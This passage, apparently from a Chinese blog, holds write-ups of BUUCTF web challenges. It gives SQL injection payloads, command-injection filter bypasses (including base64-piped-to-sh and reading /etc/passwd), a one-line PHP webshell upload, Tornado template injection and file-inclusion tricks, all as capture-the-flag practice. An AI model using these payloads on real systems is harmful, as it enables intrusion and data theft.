RTA/x11</td></tr><tr><td>User-Agent</td><td>User-Agent的内容包含发出请求的用户信息</td><td>User-Agent: Mozilla/5.0 (Linux; X11)</td></tr><tr><td>Via</td><td>通知中间网关或代理服务器地址，通信协议</td><td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td></tr><tr><td>Warning</td><td>关于消息实体的警告信息</td><td>Warn: 199 Miscellaneous warning</td></tr></tbody></table><hr><h2 id="四、-极客大挑战-2019-EasySQL1"><a href="#四、-极客大挑战-2019-EasySQL1" class="headerlink" title="四、[极客大挑战 2019]EasySQL1"></a>四、[极客大挑战 2019]EasySQL1</h2><p>首先随便输入一个账号密码</p><p><img src="/2021/01/16/BUUctf-wp/22.png"></p><p><img src="/2021/01/16/BUUctf-wp/9.jpg"></p><p>虽然看题是sql注入但依据流程首先还是要检查有无注入payload：username=1’ or 1=1%23&amp;password=1</p><p><img src="/2021/01/16/BUUctf-wp/23.png"></p><p>没想到flag直接出现，真是还没开始就结束了。</p><h2 id="五、-强网杯-2019-随便注"><a href="#五、-强网杯-2019-随便注" class="headerlink" title="五、[强网杯 2019]随便注"></a>五、[强网杯 2019]随便注</h2><p>首先看看输入的内容是由什么闭合的，payload: inject=1%27</p><p><img src="/2021/01/16/BUUctf-wp/26.jpg"></p><p>结果报错，并且显示是由单引号闭合的。</p><p>有没有注入漏洞 payload：inject=1‘ and 1=1%23</p><p><img src="/2021/01/16/BUUctf-wp/24.png"></p><p>结果回显与inject=1相同，即正确</p><p>接着试试payload：inject=1’ and 1=2%23</p><p><img src="/2021/01/16/BUUctf-wp/25.png"></p><p>结果无回显，说明存在字符型注入漏洞</p><p>接着查看字段数<code>?inject=1%27 order by 2 %23</code>回显正确；</p><p><code>?inject=1%27 order by 3 %23</code>回显报错，即表示有两个注入字段</p><p><img src="/2021/01/16/BUUctf-wp/27.jpg"></p><p><img src="/2021/01/16/BUUctf-wp/28.jpg"></p><p>接着用量注入payload：?inject=1%27 union select 1,2%23</p><p><img src="/2021/01/16/BUUctf-wp/29.jpg"></p><p>结果回显基本的查询关键词都被过滤了。</p><p>百度后才知道这涉及到叠堆注入和改数据库（是我没接触过的内容）。</p><p>堆叠注入原理</p><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><p>比如输入 1’;show tables;# 结果先出现最初回显的两个字段，接着又出现两张表名。</p><p><img src="/2021/01/16/BUUctf-wp/30.png"></p><p>接着分别查看两张表的内容</p><p><img src="/2021/01/16/BUUctf-wp/31.png"></p><p><img src="/2021/01/16/BUUctf-wp/32.png"></p><p>注：这里的inject要等于0，如果等于1查询words表时就只能显示最初的数据，可能是有字段数限制。第二个数字表要用``引用。</p><p>显然flag字段在第二个表，而最初显示的数据就是words表，id=1，data=hahaha，所以这里用到了改名和修改表，因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，把flag字段和其值显现出来，并且这里没有过滤rename和alter。</p><p>alter用法：</p><p>1：删除列</p><p>ALTER TABLE 【表名】 DROP 【列名】<br>2：增加列</p><p>ALTER TABLE 【表名】 ADD 【列名】 【类型】<br>alter table table1 add transactor varchar(10) not Null;<br>3：重命名列</p><p>ALTER TABLE 【表名】 CHANGE 【列名】【新名】<br>4：修改表字段</p><p>alter table 表名称 change 字段名称 字段名称 字段类型 [是否允许非空];<br>alter table 表名称 modify 字段名称 字段类型 [是否允许非空];<br>5：查询表的字段信息</p><p>desc 表名称;<br>6：创建索引</p><p>ALTER TABLE tbl_name ADD INDEX index_name (column list);<br>7：删除索引</p><p>ALTER TABLE tbl_name DROP INDEX index_name (column list);<br>8：修改表名</p><p>ALTER TABLE tbl_name rename new_tbl_name;</p><p>rename:</p><p>rename table old_table to new_table;</p><p>payload=<code>0&#39;;rename table words to words1;rename table 1919810931114514 to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;#</code></p><p><img src="/2021/01/16/BUUctf-wp/33.png"></p><p>所以原本回显id，hahaha的位置就变成flag了。</p><h2 id="六、-SUCTF-2019-EasySQL"><a href="#六、-SUCTF-2019-EasySQL" class="headerlink" title="六、[SUCTF 2019]EasySQL"></a>六、[SUCTF 2019]EasySQL</h2><p>当输入输入数字的时候回显是：Array ( [0] =&gt; 1 )</p><p>当输入字符时缺什么都不显示了，就算试了布尔＆时间盲注都是不回显的。想着试试上一题的叠堆注入经过多次尝试，发现不加引号和注释符才能成功。分别试了1;show databases; 和1;show tables;</p><p><img src="/2021/01/16/BUUctf-wp/34.png"></p><p><img src="/2021/01/16/BUUctf-wp/35.png"></p><p>但是 1;show columns from flag;却没回显。</p><p>查阅了大佬们的wp认为这是我的当前水平不可能做出来的。</p><p>主要有2个方法。首先猜测后端是 ： <code>select $_POST[&#39;query&#39;] || flag from flag</code></p><p>因为||（或）的存在，使得最终只回显前面的语句，而当我们输入数字时会创建一个临时列，比如Array ( [0] =&gt; 1 )</p><h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p>payload=<code>*,1</code></p><p>该语句等于<code>select *,1 || flag from flag</code> 因为<code>1 || flag</code>等同于1，所以最终等同于<code>select *,1 from flag</code></p><p><img src="/2021/01/16/BUUctf-wp/36.png"></p><p>所以最终结果中不但有flag还有[1] =&gt; 1</p><h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><p>payload=<code>1;set sql_mode=pipes_as_concat;select 1</code></p><p>set sql_mode=pipes_as_concatd的意思很好理解，就是把||视为concat</p><p>最终语句等同于1;select concat(1,flag) from flag</p><p><img src="/2021/01/16/BUUctf-wp/37.png"></p><p>所以1的键值这次在前面。</p><hr><h2 id="七、-极客大挑战-2019-LoveSQL"><a href="#七、-极客大挑战-2019-LoveSQL" class="headerlink" title="七、[极客大挑战 2019]LoveSQL"></a>七、[极客大挑战 2019]LoveSQL</h2><p>首先 用户名输入 1’ or 1=1# 密码随便输</p><p><img src="/2021/01/16/BUUctf-wp/38.jpg"></p><p>以为flag出来了，没想到是假的，不过知道了用户名。</p><p>接着查看注入段。order by 3时回显正常 order by 4 回显错误</p><p><img src="/2021/01/16/BUUctf-wp/39.jpg"></p><p><img src="/2021/01/16/BUUctf-wp/40.jpg"></p><p>接着查看注入位 payload=<code>-1&#39; union select 1,2,3#</code></p><p><img src="/2021/01/16/BUUctf-wp/41.jpg"></p><p>注入位在2,3字段。接着看数据库名，payload=<code>-1&#39; union select 1,2,database()#</code></p><p><img src="/2021/01/16/BUUctf-wp/42.jpg"></p><p>当前数据库名为geek，接着爆表，payload=<code>-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p><p><img src="/2021/01/16/BUUctf-wp/43.jpg"></p><p>接着爆geekuser和l0ve1ysq1的字段。payload=<code>-1‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’geekuser’#</code></p><p><img src="/2021/01/16/BUUctf-wp/44.jpg"></p><p>最后爆id，username，password数据 。payload=<code>-1’ union select 1,2,group_concat(id,username,password) from geekuser#</code></p><p><img src="/2021/01/16/BUUctf-wp/45.jpg"></p><p>得到flag。</p><hr><h2 id="八、-极客大挑战-2019-BabySQL1"><a href="#八、-极客大挑战-2019-BabySQL1" class="headerlink" title="八、[极客大挑战 2019]BabySQL1"></a>八、[极客大挑战 2019]BabySQL1</h2><p>首先由提示可知这次做了过滤，首先使用万能的<code>username=1‘ or 1=1#</code></p><p><img src="/2021/01/16/BUUctf-wp/46.jpg"></p><p>但是报错 并且报错内容不是闭合方式的原因 猜测过滤了or ，接着试了and 发现同样报错并且没了and，之后测试也发现过滤了union select</p><p>查阅了他人的wp后知道这是用了replace函数，replace()函数直接用双写绕过就行了。如用户名：1’ oorr 1=1# 过滤后还有or 涨姿势了！</p><p><img src="/2021/01/16/BUUctf-wp/47.jpg"></p><p>回显正确。接着与上面题同样的思路继续注入</p><p>爆库payload=<code>-1&#39; uniunionon selselectect 1,2,database()#</code></p><p>爆表payload=<code>-1‘ uniunionon selselectect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema=database()#</code> 过程中发现了更多的关键字被过滤</p><p>爆字段payload=<code>-1’ uniunionon selselectect 1,2,group_concat(column_name) ffromrom infoorrmation_schema.columns whwhereere table_schema=database() anandd table_name=&#39;b4bsql&#39;#</code></p><p>爆数据payload=<code>-1’ uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql#</code></p><p>password中也有or。</p><p><img src="/2021/01/16/BUUctf-wp/48.jpg"></p><hr><h2 id="九、-GXYCTF2019-Ping-Ping-Ping"><a href="#九、-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="九、[GXYCTF2019]Ping Ping Ping"></a>九、[GXYCTF2019]Ping Ping Ping</h2><p>首先进入页面只有 <strong>/?ip=</strong>,由题目又想到在url中ping一下，于是打算ping一下回环地址看看会怎样 ，payload=<code>?ip=127.0.0.1</code></p><p><img src="/2021/01/16/BUUctf-wp/49.jpg"></p><p>ping成功了，看来这是可以执行命令的，试试看能不能ls目录，payload=?ip=127.0.0.1;ls</p><p><img src="/2021/01/16/BUUctf-wp/50.jpg"></p><p>看来这是可以执行linux命令的，接着就想到了cat函数，看看能不能查看flag.php,没想到失败了。</p><p><img src="/2021/01/16/BUUctf-wp/51.jpg"></p><p>之后试了cat index.php,结果都是一样。猜想是不是cat被过滤了，试了下ca/t flag.php 还是以失败告终，但是回显不一样了，由回显提示，更加确定是后台有过滤操作，而前者是过滤了空格，后者过滤了符号。</p><p><img src="/2021/01/16/BUUctf-wp/52.jpg"></p><p>看了其他大佬的wp后涨了姿势。</p><p><strong>当过滤了空格时可以</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%20(space)、%09(tab)、$IFS$9、 IFS、IFS</span><br><span class="line">使用&lt;或者&lt;&gt;来绕过空格 cat&lt;a.txt</span><br><span class="line">花括号扩展&#123;OS_COMMAND,ARGUMENT&#125; &#123;cat,&#x2F;etc&#x2F;passwd&#125;</span><br><span class="line">$IFS 空格绕过 cat$IFSa.txt</span><br><span class="line">变量控制 X&#x3D;$&#39;cat\x09.&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>构造<code>?ip=127.0.0.1;cat$IFS$1flag.php</code> 结果报错又变le，由提示可知应该是过滤了flag。</p><p><img src="/2021/01/16/BUUctf-wp/53.jpg"></p><p>这时试试有没有过滤index。</p><p><img src="/2021/01/16/BUUctf-wp/54.jpg"></p><p>结果出现了过滤信息</p><ol><li>可以通过变量实现字符串拼接</li></ol><p>​ 构造/?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php 即可获取flag</p><p>​ 注：此处将变量ab的位置互换是为了绕过字符串匹配</p><p>2.通过执行sh命令来执行 （bash被过滤了，不然也可以执行）</p><p>​ 构造/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1- d|sh</p><p>​ 注：sh是linux中运行shell的命令，bash相当于sh的升级版，sh∈bash</p><hr><p>关键字过滤</p><p>使用空变量 使用$<em>和$@，$x(x 代表 1-9),${x}(x&gt;=10)(我尝试小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 ca${21}t a.txt<br>反斜杠 ca\t a.txt<br>变量替换 a=ca;b=t;c=a.txt; a a ab $c<br>引号 c’a’t flag.php<br>编码绕过<br>Base64 编码绕过：<br>root@kali:<del>/# echo ‘cat a.txt’| base64 Y2F0IGEudHh0Cg==<br>root@kali:</del>/# echo ‘Y2F0IGEudHh0Cg==’ | base64 -d abc<br>十六进制编码绕过：<br>root@kali:<del>/# echo ‘cat a.txt’ | xxd -p 63617420612e7478740a<br>root@kali:</del>/# echo ‘0x63617420612e7478740a’| xxd -r -p Abc<br>通配符 ？</em><br>[…]：匹配范围中任何一个字符 cat fl[abc]g.php<br>[a-z]：匹配 a-z 范围中任何一个字符 cat fl[a-z]g.php<br>{a,b}：对以逗号分割的文件列表进行拓展 cat fl{b,c}g.php</p><hr><h2 id="十、-RoarCTF-2019-Easy-Calc"><a href="#十、-RoarCTF-2019-Easy-Calc" class="headerlink" title="十、[RoarCTF 2019]Easy Calc"></a>十、[RoarCTF 2019]Easy Calc</h2><p>打开是一个计算机，试着算了1+2，能成功，但是换成字母就会失败。</p><p><img src="/2021/01/16/BUUctf-wp/55.jpg"></p><p><img src="/2021/01/16/BUUctf-wp/56.jpg"></p><p>查看页面源代码。</p><p><img src="/2021/01/16/BUUctf-wp/57.jpg"></p><p>出现了两个信息，一个是有个提示设置了WAF安全，另一个是有个calc.php 访问下试试。</p><p><img src="/2021/01/16/BUUctf-wp/58.jpg"></p><p>设置了一个黑名单，可以用chr（）绕过。</p><p>百度后知道，这里不给传字母，应该就是waf的作用。</p><p>php处理字符时具有需要将所有参数转换为有效的变量名的特性，因此在解析查询字符串时，它会做两件事：</p><ul><li>删除空白符</li><li>将某些字符转换为下划线（包括空格）</li></ul><p>如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)</p><p>WAF不允许num传入字母，那我们可以在num前加个空格来绕过WAF</p><p>所以可以先查看下phpinfo看看禁了什么函数。</p><p><img src="/2021/01/16/BUUctf-wp/59.jpg"></p><p>首先我们要先扫根目录下的所有文件，也就是用·scandir(“/“),但是“/”被过滤了，所以我们用chr(“47”)绕过,发现flagg文件</p><p><img src="/2021/01/16/BUUctf-wp/60.jpg"></p><p>接着可以用show_source、file_get_contents、include函数</p><p>? num=print_r(show_source(‘/flagg’));<br>这里/=chr(47)，f=chr(102),l=chr(49),a=chr(97),g=chr(103),g=chr(103)来进行绕过num=print_r(show_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</p><hr><h2 id="十一、-HCTF-2018-WarmUp"><a href="#十一、-HCTF-2018-WarmUp" class="headerlink" title="十一、[HCTF 2018]WarmUp"></a>十一、[HCTF 2018]WarmUp</h2><p>打开是一个滑稽，先查看原代码，发现了一个source.php</p><p><img src="/2021/01/16/BUUctf-wp/61.jpg"></p><p>访问后有php代码。</p><p><img src="/2021/01/16/BUUctf-wp/62.jpg"></p><p>其中有个hint.php,先访问看看。</p><p><img src="/2021/01/16/BUUctf-wp/63.jpg"></p><p>告诉我们flag在这里面 ，先审计下source.php的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        	<span class="comment">//设置白名单</span></span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];         </span><br><span class="line">            <span class="comment">//若$page未设置或为空 或 $page不是字符串，返回false</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">			<span class="comment">//若$page是$whitelist的值，返回true</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//在$page末尾添加?   并返回添加？后 首个？之前的字符串</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line"> <span class="comment">//$_page = $page           </span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>只有满足$_REQUEST[‘file’]非空 、$_REQUEST[‘file’]是字符串、emmm::checkFile($_REQUEST[‘file’])为true那么就会include $_REQUEST[‘file’]</p><p>可以发现两次$page的url编码，第一次是url传入到服务器时解码了一次，第二次是page传给_page解码了一次</p><p>第一个if要求page为字符串，否则返回false第二个if语句判断page是否存在于 whitelist 数组中，存在则返回 true 第三个if语句判断截取后的whitelist数组中，存在则返回true 第三个if语句判断截取后的$page是否在 whitelist数组中，截取 whitelist数组中，截取page中’?‘前部分，存在则返回true，第四个if语句判断url解码并截取后的 page是否存在于page是否存在于 page是否存在于whitelist中，存在则返回true<br>若以上四个if语句均未返回值，则返回false有三个if语句可以返回true，第二个语句直接判断$page，不可用<br>第三个语句截取’?‘前部分，由于?被后部分被解析为get方式提交的参数，也不可利用第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。<br>只要这四个if语句有一个为true即可包含file,</p><p>所以payloadsource.php?file=source.php%253f/ffffllllaaaagggg，但是不知道ffffllllaaaagggg的具体位置，所以要不段增加../</p><p><img src="/2021/01/16/BUUctf-wp/64.jpg"></p><h2 id="十二、-极客大挑战-2019-Havefun"><a href="#十二、-极客大挑战-2019-Havefun" class="headerlink" title="十二、[极客大挑战 2019]Havefun"></a>十二、[极客大挑战 2019]Havefun</h2><p>打开一张猫打图片，无任何提示，首先查看页面源代码。</p><p><img src="/2021/01/16/BUUctf-wp/65.jpg"></p><p>就按照提示传参cat=dog，没想到直接结束。</p><p><img src="/2021/01/16/BUUctf-wp/66.png"></p><h2 id="十三、-ACTF2020-新生赛-Include"><a href="#十三、-ACTF2020-新生赛-Include" class="headerlink" title="十三、[ACTF2020 新生赛]Include"></a>十三、[ACTF2020 新生赛]Include</h2><p><img src="/2021/01/16/BUUctf-wp/67.jpg"></p><p>点击tips</p><p><img src="/2021/01/16/BUUctf-wp/68.jpg"></p><p>结果没有什么发现，源代码也没有什么，但是由该url=?file=flag.php,和题目为include猜测是文件包含漏洞，试试伪协议构造payload =?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p><img src="/2021/01/16/BUUctf-wp/69.jpg"></p><p>base64解码</p><p><img src="/2021/01/16/BUUctf-wp/70.jpg"></p><hr><h2 id="十四、-极客大挑战-2019-Knife1"><a href="#十四、-极客大挑战-2019-Knife1" class="headerlink" title="十四、[极客大挑战 2019]Knife1"></a>十四、[极客大挑战 2019]Knife1</h2><p>打开给了提示菜刀并且给了连接密码。</p><p><img src="/2021/01/16/BUUctf-wp/71.png"></p><p>这里我用蚁剑连接。</p><p><img src="/2021/01/16/BUUctf-wp/72.jpg"></p><p>连接成功。在根目录下发现flag。</p><p><img src="/2021/01/16/BUUctf-wp/73.jpg"></p><p><img src="/2021/01/16/BUUctf-wp/74.jpg"></p><hr><h2 id="十五、-护网杯-2018-easy-tornado"><a href="#十五、-护网杯-2018-easy-tornado" class="headerlink" title="十五、[护网杯 2018]easy_tornado"></a>十五、[护网杯 2018]easy_tornado</h2><p>打开给了3个文件<img src="/2021/01/16/BUUctf-wp/75.jpg"><img src="/2021/01/16/BUUctf-wp/78.jpg"></p><p><img src="/2021/01/16/BUUctf-wp/76.jpg"><img src="/2021/01/16/BUUctf-wp/77.jpg"></p><p>同时发现每个文件查看时url都是相似的<img src="/2021/01/16/BUUctf-wp/79.jpg"></p><p>显然flag在fllllllag中，并且要按照hints中的方式查看。</p><p>所以我们要按照这种方式传参 <code>file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))</code></p><p>那么怎么找到cookie_secret呢？</p><p>当访问file?filename=/fllllllllllllag时</p><p><img src="/2021/01/16/BUUctf-wp/80.jpg"></p><p>可以看到url中 error？msg=Error，修改msg的值后，回显为修改后的值</p><p><img src="/2021/01/16/BUUctf-wp/81.jpg"></p><p>查阅其他人的wp后知道这里需要用到在tornado的知识，大概就是在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量<br>修改error?msg=</p><p><img src="/2021/01/16/BUUctf-wp/82.jpg"></p><p>这就得到了cookie_secret</p><p>接着就是将md5(cookie_secret+md5(filename))求出来就可以了</p><p><img src="/2021/01/16/BUUctf-wp/83.png"></p><hr><h2 id="十六、-极客大挑战-2019-Http1"><a href="#十六、-极客大挑战-2019-Http1" class="headerlink" title="十六、[极客大挑战 2019]Http1"></a>十六、[极客大挑战 2019]Http1</h2><p>首先打开的界面没有什么信息，查看源代码，发现一个secret.php</p><p><img src="/2021/01/16/BUUctf-wp/84.jpg"></p><p><img src="/2021/01/16/BUUctf-wp/85.jpg"></p><p>查看源代码也没发现什么信息，又根据题目我就猜到可能是要抓包改header请求头。</p><p>这一步就需要加个Referer头</p><p><img src="/2021/01/16/BUUctf-wp/86.jpg"></p><p>接着又提示我们要用Syclover浏览器，继续伪造User Agent头</p><p><img src="/2021/01/16/BUUctf-wp/87.jpg">接着又说访问者的地址是localhost。查询后发现，绕过方法有添加X-Forwarded-For绕过。</p><p><img src="/2021/01/16/BUUctf-wp/88.jpg"></p><p>成功获取flag。</p><hr><h2 id="十七、-极客大挑战-2019-Upload"><a href="#十七、-极客大挑战-2019-Upload" class="headerlink" title="十七、[极客大挑战 2019]Upload"></a>十七、[极客大挑战 2019]Upload</h2><p>由题目和界面可知这是要我们上传一个图片，首先随便上传一个图片</p><p><img src="/2021/01/16/BUUctf-wp/89.jpg"></p><p>但是它回显却说这不是图片</p><p><img src="/2021/01/16/BUUctf-wp/90.jpg"></p><p>看来是有过滤后缀名，之后写个一句话木马，不断尝试不同类型的格式，发现大多数格式都被过滤，只有phtml未被过滤</p><script language="php">eval($_POST[1])</script><p>上传后发现还是提示不是图片，可能是后缀的问题。这里可以抓包，并修改文件类型为image文件</p><p><img src="/2021/01/16/BUUctf-wp/91.jpg">)</p><p><img src="/2021/01/16/BUUctf-wp/92.jpg"></p><p>但是回显却说这不是图片，应该是对图片内容进行了检测。</p><p>这里还需要在文件内容开头加入GIF89a，这是用于检测是否是jpeg文件的文件头。</p><p><img src="/2021/01/16/BUUctf-wp/93.jpg"></p><p>上传成功，猜测在upload目录</p><p><img src="/2021/01/16/BUUctf-wp/94.jpg"></p><p>结果确实在，接下来用蚁剑连接</p><p>之后用中国蚁剑连接，在根目录下找到flag</p><p><img src="/2021/01/16/BUUctf-wp/95.jpg"></p><hr><h2 id="十八、-极客大挑战-2019-BuyFlag"><a href="#十八、-极客大挑战-2019-BuyFlag" class="headerlink" title="十八、[极客大挑战 2019]BuyFlag"></a>十八、[极客大挑战 2019]BuyFlag</h2><p>进入页面没有什么发现，查看源代码。</p><p><img src="/2021/01/16/BUUctf-wp/96.jpg"></p><p>这里要传参钱和密码，密码为404且不能为数字，百度后知道可以弱类型绕过，传个404a就可以绕过。钱的量想到最初的页面</p><p><img src="/2021/01/16/BUUctf-wp/97.jpg"></p><p>这里先抓包，传参</p><p><img src="/2021/01/16/BUUctf-wp/98.jpg"></p><p>但是没有反应，看了师傅们的wp后知道这里的user还要改成1。</p><p><img src="/2021/01/16/BUUctf-wp/99.jpg"></p><p>提示说钱的长度太长，这里可以用科学计数法1e10</p><p>有的师傅们提示是strcmp函数。这个函数在数据类型不匹配的时候会返回0，也就是和比较成功的结果是一样的。因此只要传入非字符串类型就可以了。最后得到flag。</p><p><img src="/2021/01/16/BUUctf-wp/100.jpg"></p><h2 id="十九、-BJDCTF2020-Easy-MD5"><a href="#十九、-BJDCTF2020-Easy-MD5" class="headerlink" title="十九、[BJDCTF2020]Easy MD5"></a>十九、[BJDCTF2020]Easy MD5</h2><p>打开页面只有个查询输入框，先输个1，结果没有什么变化，但是url上多了个password=1.</p><p><img src="/2021/01/16/BUUctf-wp/101.jpg"></p><p>先看看是不是sql注入，试了下1‘ or 1=1#，还是没回显</p><p><img src="/2021/01/16/BUUctf-wp/102.jpg"></p><p>后面还试了延时注入，都是无回显，所以试试抓包。但是也没什么发现，之后无意间在response中发现了hint，真是藏得太深了。</p><p><img src="/2021/01/16/BUUctf-wp/103.jpg"></p><p>百度了password=MD5（$pass,ture）,师傅们给了一个绕过方法<strong>ffifdyop</strong></p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/March97/article/details/81222922">绕过链接</a></p><p>接着就在元素查看器中出现了代码</p><p><img src="/2021/01/16/BUUctf-wp/104.jpg"></p><p>代码很简单，就是MD5弱绕过，找两个0e开头的MD5值或者数组就可</p><p><img src="/2021/01/16/BUUctf-wp/105.jpg"></p><p>接着又是一个绕过为强绕过，绕过方法只能用第二种</p><p><img src="/2021/01/16/BUUctf-wp/106.jpg"></p><hr><h2 id="二十、-GXYCTF2019-BabySQli"><a href="#二十、-GXYCTF2019-BabySQli" class="headerlink" title="二十、[GXYCTF2019]BabySQli"></a>二十、[GXYCTF2019]BabySQli</h2><p>由题目和界面可知这是一个sql注入题。首先试了下1’ or 1=1#,结果报错</p><p><img src="/2021/01/16/BUUctf-wp/107.jpg"></p><p>猜测or是被过滤了，接着输入了1，回显是错误user</p><p><img src="/2021/01/16/BUUctf-wp/108.jpg"></p><p>查看源代码，发现了提示</p><p><img src="/2021/01/16/BUUctf-wp/109.jpg"></p><p>将提示最终以base32和base64两次解码成功</p><p><img 